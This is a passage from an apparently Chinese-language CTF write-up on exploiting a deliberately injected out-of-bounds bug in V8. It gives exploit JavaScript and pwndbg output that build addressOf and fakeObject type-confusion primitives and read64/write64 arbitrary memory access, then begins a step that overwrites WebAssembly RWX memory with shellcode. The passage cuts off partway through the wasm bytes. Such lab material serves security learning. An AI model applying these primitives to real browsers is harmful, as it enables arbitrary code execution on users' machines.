function_">ftoi</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-keyword">var</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1.1</span>];<br><br>%<span class="hljs-title class_">DebugPrint</span>(a);<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br><span class="hljs-keyword">var</span> data = a.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;data:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(data)));<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br>a.<span class="hljs-title function_">oob</span>(<span class="hljs-number">2</span>);<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>通过越界访问读取到的数据,刚好是a的map. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x062a0214e041</span><br><br>0x62a0214e041: [JSArray]<br><br> - map: 0x3629c0182ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br> - prototype: 0x20262e251111 &lt;JSArray[0]&gt;<br><br> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br> - length: 3<br><br> - properties: 0x2b2ef8980c71 &lt;FixedArray[0]&gt; &#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> #</span><span class="language-bash">length: 0x3a4d7cec01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> &#125;<br><br> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; &#123;<br><br>​      0: 1<br><br>​      1: 2<br><br>​      2: 1.1<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span><br><br>Continuing.<br><br>data:0x3629c0182ed9<br></code></pre></td></tr></table></figure><p>在a.oob(2)执行后,a对象的map字段被修改为2的浮点数表示. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pwndbg&gt; x/8gx <span class="hljs-number">0x062a0214e040</span><br><br><span class="hljs-number">0x62a0214e040</span>:  <span class="hljs-number">0x00003629c0182ed9</span>  <span class="hljs-number">0x00002b2ef8980c71</span><br><br><span class="hljs-number">0x62a0214e050</span>:  <span class="hljs-number">0x0000062a0214e019</span>  <span class="hljs-number">0x0000000300000000</span><br><br><span class="hljs-number">0x62a0214e060</span>:  <span class="hljs-number">0x00002b2ef8980561</span>  <span class="hljs-number">0x00003629c0182ed9</span><br><br><span class="hljs-number">0x62a0214e070</span>:  <span class="hljs-number">0x00002b2ef89812c9</span>  <span class="hljs-number">0x0000000100000000</span><br><br> <br><br>pwndbg&gt; x/8gx <span class="hljs-number">0x062a0214e040</span><br><br><span class="hljs-number">0x62a0214e040</span>:  <span class="hljs-number">0x4000000000000000</span>  <span class="hljs-number">0x00002b2ef8980c71</span><br><br><span class="hljs-number">0x62a0214e050</span>:  <span class="hljs-number">0x0000062a0214e019</span>  <span class="hljs-number">0x0000000300000000</span><br><br><span class="hljs-number">0x62a0214e060</span>:  <span class="hljs-number">0x00002b2ef8980561</span>  <span class="hljs-number">0x00003629c0182ed9</span><br><br><span class="hljs-number">0x62a0214e070</span>:  <span class="hljs-number">0x00002b2ef89812c9</span>  <span class="hljs-number">0x0000000100000000</span><br></code></pre></td></tr></table></figure><p>现在可以通过oob函数对变量的map字段进行任意读取写入,然后对变量的类型进行随意的更改. 可以混淆对象数组和浮点数组的类型,用于读取对象内存地址或者将一个浮点数伪造成一个js对象.因为v8依赖map字段判断变量类型. 实现任意对象内存地址读取,与fake js对象的函数. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> obj_addr;<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">1</span>);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>测试 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-keyword">var</span> obj_arr = [obj];<br><br><span class="hljs-keyword">var</span> flo_arr = [<span class="hljs-number">1.1</span>];<br><br>obj_arr_map=obj_arr.<span class="hljs-title function_">oob</span>();<br><br>flo_arr_map=flo_arr.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;obj_arr_map:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(obj_arr_map)));<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;flo_arr_map:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(flo_arr_map)));<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;====================================&quot;</span>)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  bigUint64[<span class="hljs-number">0</span>] = i;<br><br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(obj_arr[<span class="hljs-number">0</span>]));<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> obj_addr;<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">1</span>);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br> <br><br><span class="hljs-keyword">var</span> test_obj=&#123;&#125;;<br><br>%<span class="hljs-title class_">DebugPrint</span>(test_obj);<br><br><span class="hljs-keyword">var</span> test_obj_addr=<span class="hljs-title function_">addressOf</span>(test_obj);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;leak obj addr:0x&quot;</span>+test_obj_addr);<br></code></pre></td></tr></table></figure><p>成功泄露 testobj地址 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜ v8 git:(6dc88c191f) ✗ ./out/x64_startctf.release/d8 --allow-natives-syntax ./test.js<br><br>obj_arr_map:0x3fa5718c2f79<br><br>flo_arr_map:0x3fa5718c2ed9<br><br>====================================<br><br>0x0f696c58edc9 &lt;Object map = 0x3fa5718c0459&gt;<br><br>leak obj addr:0xf696c58edc9<br></code></pre></td></tr></table></figure><h5 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h5><p>实现任意地址读写可以通过fake一个对象,这个对象的任何属性我们都是可控的,然后将elements字段修改为我们要读取或修改的内存地址,就可以实现任意地址读写. 但是有几个问题需要解决,需要查找elements的内存地址,可以通过elements字段与map字段的偏移计算. 可以看出,elements字段为0x2b131b9cec19,位于map字段的低地址处,与存储map字段的地址:0x2b131b9cec48,偏移为0x10. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2b131b9cec49</span><br><br>0x2b131b9cec49: [JSArray]<br><br> \- map: 0x14e6ac9c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br> \- prototype: 0x3727cfcd1111 &lt;JSArray[0]&gt;<br><br> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br> \- length: 4<br><br> \- properties: 0x00a2a3840c71 &lt;FixedArray[0]&gt; &#123;<br><br>  \#length: 0x373c6a3001a9 &lt;AccessorInfo&gt; (const accessor descriptor)<br><br> &#125;<br><br> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; &#123;<br><br>​      0: 1<br><br>​      1: 2<br><br>​      2: 3<br><br>​      3: 1.1<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec48</span><br><br>00:0000│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401<br><br>01:0008│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408<br><br>02:0010│ 0x2b131b9cec58 —▸ 0x2b131b9cec19 ◂— 0xa2a38414<br><br>03:0018│ 0x2b131b9cec60 ◂— 0x400000000<br><br>04:0020│ 0x2b131b9cec68 ◂— 0x0<br><br>... ↓   3 skipped<br><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec18</span><br><br>00:0000│ 0x2b131b9cec18 —▸ 0xa2a38414f9 ◂— 0xa2a38401<br><br>01:0008│ 0x2b131b9cec20 ◂— 0x400000000<br><br>02:0010│ 0x2b131b9cec28 ◂— 0x3ff0000000000000<br><br>03:0018│ 0x2b131b9cec30 ◂— 0x4000000000000000<br><br>04:0020│ 0x2b131b9cec38 ◂— 0x4008000000000000<br><br>05:0028│ 0x2b131b9cec40 ◂— 0x3ff199999999999a<br><br>06:0030│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401<br><br>07:0038│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408<br></code></pre></td></tr></table></figure><p>知道了变量的内存结构,下面开始手动构造一个arr,通过addressof获取这个变量elements元素值的地址,并将其fake为一个对象.然后通过fake_arr修改fake对象的elements字段,并通过fake对象读取或写入,可以实现任意地址的读写操作. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(obj_addr);<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-keyword">let</span> ret_data=<span class="hljs-title function_">f2i</span>(fake_obj[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;read addr:0x:&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(ret_data));<br><br>  <span class="hljs-keyword">return</span> ret_data;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  fake_obj[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(data);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;write addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(data));<br><br>&#125;<br><br> <br><br>fake_arr=[<br><br>  flo_arr_map,<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x41414141n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1000000000n</span>),<br><br> <span class="hljs-number">1.1</span>,<br><br> <span class="hljs-number">2.2</span><br><br>];<br><br>fake_addr=<span class="hljs-title function_">addressOf</span>(fake_arr);<br><br><span class="hljs-comment">//get elements:value &amp; fake obj</span><br><br><span class="hljs-keyword">var</span> fake_obj_addr=fake_addr-<span class="hljs-number">0x30n</span>;<br><br>fake_obj=<span class="hljs-title function_">fakeObject</span>(fake_obj_addr);<br></code></pre></td></tr></table></figure><h5 id="通过wasm执行shellcode"><a href="#通过wasm执行shellcode" class="headerlink" title="通过wasm执行shellcode"></a>通过wasm执行shellcode</h5><p>wasm可以将js生成为机器码执行,运行时会开辟一段具有rwxp属性的内存空间用于执行wasm code,但是本身无法调用一些系统库,因为做了限制,调用一些系统库会报错,但是我们可以找到这个内存空间,将自己的shellcode写入其中,覆盖wasm code,然后调用wasm执行. wasm demo，可以将c 转换为wasm code的网站:<a href="https://wasdk.github.io/WasmFiddle/">https://wasdk.github.io/WasmFiddle/</a> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">int <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <br><br> <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;<br><br>&#125;<br><br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span 